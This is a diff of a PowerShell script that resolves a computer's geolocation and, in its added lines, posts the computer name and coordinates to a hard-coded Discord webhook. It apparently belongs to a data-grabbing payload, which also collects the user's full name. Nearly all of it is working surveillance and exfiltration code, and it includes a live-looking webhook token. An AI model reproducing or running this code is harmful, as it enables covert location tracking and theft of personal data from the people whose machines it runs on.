@@ -72,34 +72,27 @@ $FN = Get-fullName
 
 function Get-GeoLocation{
 	try {
-    Add-Type -AssemblyName System.Device
-    $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
-    $GeoWatcher.Start()
+	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
+	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
+	$GeoWatcher.Start() #Begin resolving current locaton
 
-    while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
-        Start-Sleep -Milliseconds 100
-    }
+	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+		Start-Sleep -Milliseconds 100 #Wait for discovery.
+	}  
 
-    if ($GeoWatcher.Permission -eq 'Denied') {
-        Write-Error 'Access Denied for Location Information'
-    } else {
-        $location = $GeoWatcher.Position.Location
-        $latitude = $location.Latitude
-        $longitude = $location.Longitude
-        $coordinates = "$latitude,$longitude"
-
-        # Replace with your Discord webhook URL
-        $webhookUrl = $dwh
-        $body = @{
-            content = "Computer: $computerName`nCoordinates: $coordinates"
-        } | ConvertTo-Json
-
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
-    }
-} catch {
-    Write-Error 'No coordinates found'
-    return 'No Coordinates found'
+	if ($GeoWatcher.Permission -eq 'Denied'){
+		Write-Error 'Access Denied for Location Information'
+	} else {
+		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
+		
+	}
+	}
+    # Write Error is just for troubleshooting
+    catch {Write-Error "No coordinates found" 
+    return "No Coordinates found"
     -ErrorAction SilentlyContinue
+    } 
+
 }
 
 #-----------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -135,6 +128,17 @@ $GL = $GL -split " "
 $Lat = $GL[0].Substring(11) -replace ".$"
 
 $Lon = $GL[1].Substring(10) -replace ".$"
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Send to Discord // Replace with your Discord webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/1094395610901250128/WLuTUwGIZ_OgPU8iIuKNSamHu0JfY_YoqJllOj--yUcLhRofWQm6SGjpwzFFBUYnEop7"
+$body = @{
+    content = "Computer: $computerName`nCoordinates: Latitude = $Lat   Longitude = $Lon"
+} | ConvertTo-Json
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Pause-Script
 
